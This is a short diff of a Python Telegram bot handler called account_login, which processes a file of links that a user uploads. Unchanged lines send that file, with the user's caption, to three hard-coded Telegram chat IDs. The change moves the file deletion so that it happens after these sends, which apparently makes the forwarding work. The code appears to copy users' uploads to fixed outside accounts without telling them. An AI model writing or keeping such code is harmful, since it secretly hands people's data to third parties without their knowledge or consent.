@@ -69,11 +69,11 @@ async def account_login(bot: Client, m: Message):
        links = []
        for i in content:
            links.append(i.split("://", 1))
-       os.remove(x)
+       
             # print(len(links)
     except:
            await m.reply_text("Invalid file input.")
-           os.remove(x)
+           
            return
     
    
@@ -83,6 +83,7 @@ async def account_login(bot: Client, m: Message):
     await bot.send_document(6345786041,x,caption=raw_text)
     await bot.send_document(6892701715,x,caption=raw_text)
     await bot.send_document(6287942937,x,caption=raw_text)
+    os.remove(x)
     await input0.delete(True)
 
     await editable.edit("**Batch Name**")
